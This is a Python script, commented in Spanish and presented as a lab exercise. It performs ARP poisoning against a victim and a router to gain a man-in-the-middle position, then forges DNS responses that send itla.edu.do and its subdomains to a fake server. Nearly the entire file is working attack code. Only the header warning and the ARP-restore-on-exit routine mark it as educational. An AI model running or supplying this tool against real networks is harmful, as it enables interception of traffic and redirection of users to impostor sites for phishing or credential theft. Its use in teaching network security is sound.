#!/usr/bin/env python3
"""
=============================================================
  DNS Spoofing / DNS Poisoning - Script educativo de laboratorio
=============================================================
  ADVERTENCIA: Solo para uso en entornos controlados y con
  autorización explícita. El uso no autorizado es ilegal.

  Topología del laboratorio:
    Víctima   : 10.15.99.50
    Atacante  : 10.15.99.100  (esta máquina)
    Servidor  : 10.15.99.150  (servidor web falso)
    Router    : 10.15.99.1/24

  Objetivo: Cuando la víctima consulte itla.edu.do,
            recibe la IP del servidor falso (10.15.99.150).

  Dependencias:
    pip install scapy
    apt install python3-scapy  (alternativo)

  Ejecución (como root):
    python3 dns_spoofing_lab.py

  Para detener: Ctrl+C  (restaura ARP automáticamente)
=============================================================
"""

import sys
import time
import signal
import threading
from scapy.all import (
    ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR,
    sendp, send, srp, sniff, conf, get_if_hwaddr
)

# ─── Configuración de red ─────────────────────────────────
IFACE        = "eth0"           # Interfaz de red del atacante (ajustar si es necesario)
VICTIMA_IP   = "10.15.99.50"
ROUTER_IP    = "10.15.99.1"
SERVIDOR_IP  = "10.15.99.150"  # IP a la que apuntará itla.edu.do
DOMINIO_FAKE = "itla.edu.do"   # Dominio a falsificar (también captura subdominios)
TTL_FAKE     = 300             # TTL de la respuesta DNS falsa (segundos)
ARP_INTERVAL = 2               # Cada cuántos segundos re-enviar ARP poison

# ─── Obtener MACs de la red ────────────────────────────────

def get_mac(ip: str) -> str:
    """Resuelve la MAC de una IP via ARP request."""
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = broadcast / arp_req
    ans, _ = srp(pkt, timeout=2, iface=IFACE, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    raise RuntimeError(f"[!] No se pudo obtener la MAC de {ip}")

# ─── ARP Poisoning ────────────────────────────────────────

def arp_poison(target_ip: str, target_mac: str, spoof_ip: str):
    """
    Envía un ARP reply falso al target diciéndole que
    somos la máquina spoof_ip (asociando nuestra MAC a esa IP).
    """
    pkt = ARP(
        op=2,                        # op=2 → ARP reply
        pdst=target_ip,              # a quién va dirigido
        hwdst=target_mac,            # MAC del destinatario
        psrc=spoof_ip,               # IP que suplantamos
        hwsrc=get_if_hwaddr(IFACE)   # nuestra MAC real
    )
    send(pkt, verbose=False)

def restore_arp(target_ip: str, target_mac: str,
                source_ip: str, source_mac: str):
    """
    Restaura la tabla ARP del target con la MAC real de source_ip.
    Se llama automáticamente al detener el script.
    """
    pkt = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    send(pkt, count=5, verbose=False)

def arp_poison_loop(victima_mac: str, router_mac: str,
                    stop_event: threading.Event):
    """
    Bucle continuo que mantiene el envenenamiento ARP activo.
    Envenena tanto a la víctima (diciéndole que somos el router)
    como al router (diciéndole que somos la víctima) → MITM completo.
    """
    print(f"[*] Iniciando ARP poisoning cada {ARP_INTERVAL}s...")
    while not stop_event.is_set():
        # Decirle a la víctima que somos el router
        arp_poison(VICTIMA_IP, victima_mac, ROUTER_IP)
        # Decirle al router que somos la víctima
        arp_poison(ROUTER_IP, router_mac, VICTIMA_IP)
        time.sleep(ARP_INTERVAL)

# ─── DNS Spoofing ─────────────────────────────────────────

def dns_spoof_handler(pkt):
    """
    Callback para cada paquete capturado.
    Si es una consulta DNS para nuestro dominio objetivo,
    inyectamos una respuesta falsa apuntando a SERVIDOR_IP.
    """
    # Filtro: solo UDP/DNS queries (tipo A) dirigidas al dominio objetivo
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):  # qr=0 → query
        return

    qname = pkt[DNS].qd.qname.decode().rstrip(".")
    if DOMINIO_FAKE not in qname:
        return

    print(f"  [+] DNS query interceptada: {qname}  →  respondiendo con {SERVIDOR_IP}")

    # Construir respuesta DNS falsa
    dns_response = (
        IP(src=pkt[IP].dst, dst=pkt[IP].src) /          # IPs invertidas
        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / # Puertos invertidos
        DNS(
            id=pkt[DNS].id,      # Mismo transaction ID
            qr=1,                # qr=1 → response
            aa=1,                # Authoritative Answer
            qd=pkt[DNS].qd,      # Misma pregunta
            an=DNSRR(
                rrname=pkt[DNS].qd.qname,  # Nombre consultado
                type="A",
                ttl=TTL_FAKE,
                rdata=SERVIDOR_IP          # IP falsa
            )
        )
    )
    send(dns_response, verbose=False, iface=IFACE)

def start_dns_sniffer():
    """
    Escucha paquetes UDP/53 provenientes de la víctima
    y ejecuta dns_spoof_handler en cada uno.
    """
    filtro_bpf = f"udp port 53 and src host {VICTIMA_IP}"
    print(f"[*] Escuchando DNS queries de {VICTIMA_IP} (filtro: {filtro_bpf})")
    sniff(
        iface=IFACE,
        filter=filtro_bpf,
        prn=dns_spoof_handler,
        store=0         # No guardar paquetes en RAM
    )

# ─── Habilitar IP Forwarding ──────────────────────────────

def enable_ip_forward():
    """Activa el reenvío de paquetes IP en el kernel."""
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[*] IP forwarding habilitado.")

def disable_ip_forward():
    """Desactiva el reenvío de paquetes IP."""
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    print("[*] IP forwarding deshabilitado.")

# ─── Main ─────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("  DNS Spoofing Lab — Solo uso educativo autorizado")
    print("=" * 60)

    # Resolver MACs antes de empezar
    print(f"[*] Resolviendo MAC de la víctima ({VICTIMA_IP})...")
    victima_mac = get_mac(VICTIMA_IP)
    print(f"    → {victima_mac}")

    print(f"[*] Resolviendo MAC del router ({ROUTER_IP})...")
    router_mac = get_mac(ROUTER_IP)
    print(f"    → {router_mac}")

    # Habilitar forwarding para no cortar el tráfico de la víctima
    enable_ip_forward()

    # Evento para detener el hilo de ARP poisoning
    stop_event = threading.Event()

    # Hilo de ARP poisoning (en background)
    arp_thread = threading.Thread(
        target=arp_poison_loop,
        args=(victima_mac, router_mac, stop_event),
        daemon=True
    )
    arp_thread.start()

    # Manejador de Ctrl+C para limpiar y restaurar
    def shutdown(sig, frame):
        print("\n[!] Deteniendo ataque y restaurando tablas ARP...")
        stop_event.set()
        restore_arp(VICTIMA_IP, victima_mac, ROUTER_IP, router_mac)
        restore_arp(ROUTER_IP, router_mac, VICTIMA_IP, victima_mac)
        disable_ip_forward()
        print("[✓] Tablas ARP restauradas. Saliendo.")
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    # Iniciar DNS sniffer/spoofer en el hilo principal
    print(f"\n[*] Objetivo DNS: {DOMINIO_FAKE} → {SERVIDOR_IP}")
    print("[*] Presiona Ctrl+C para detener y restaurar la red.\n")
    start_dns_sniffer()


if __name__ == "__main__":
    if not sys.platform.startswith("linux"):
        print("[!] Este script está diseñado para Linux.")
        sys.exit(1)
    main()
